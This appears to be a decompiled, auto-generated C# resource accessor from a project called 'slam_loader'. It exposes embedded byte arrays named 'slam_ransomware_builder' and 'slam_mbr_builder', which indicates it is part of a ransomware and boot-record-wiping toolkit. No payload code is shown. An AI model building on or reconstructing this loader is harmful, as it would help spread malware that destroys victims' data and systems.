using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace slam_loader.Properties;

[CompilerGenerated]
[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
internal class Resources
{
	private static ResourceManager resourceMan;

	private static CultureInfo resourceCulture;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			if (resourceMan == null)
			{
				ResourceManager resourceManager = (resourceMan = new ResourceManager("slam_loader.Properties.Resources", typeof(Resources).Assembly));
			}
			return resourceMan;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return resourceCulture;
		}
		set
		{
			resourceCulture = value;
		}
	}

	internal static Bitmap _2072445
	{
		get
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			object @object = ResourceManager.GetObject("_2072445", resourceCulture);
			return (Bitmap)@object;
		}
	}

	internal static byte[] slam_ransomware_builder
	{
		get
		{
			object @object = ResourceManager.GetObject("slam_ransomware_builder", resourceCulture);
			return (byte[])@object;
		}
	}

	internal static byte[] slam_mbr_builder
	{
		get
		{
			object @object = ResourceManager.GetObject("slam_mbr_builder", resourceCulture);
			return (byte[])@object;
		}
	}

	internal Resources()
	{
	}
}
